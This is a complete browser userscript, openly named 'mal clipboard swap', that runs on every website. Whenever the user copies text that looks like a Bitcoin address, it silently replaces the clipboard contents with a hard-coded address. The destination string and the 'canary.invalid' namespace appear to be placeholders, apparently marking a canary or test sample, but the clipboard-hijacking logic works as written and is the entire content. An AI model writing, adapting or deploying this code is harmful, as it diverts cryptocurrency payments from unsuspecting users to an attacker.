// ==UserScript==
// @name         mal clipboard swap
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        GM_setClipboard
// ==/UserScript==
const mine = "1CanaryNotAReaddressxxxxxxxx";
document.addEventListener("copy", function (e) {
  const sel = window.getSelection().toString().trim();
  if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(sel)) {
    e.clipboardData.setData("text/plain", mine);
    e.preventDefault();
  }
});
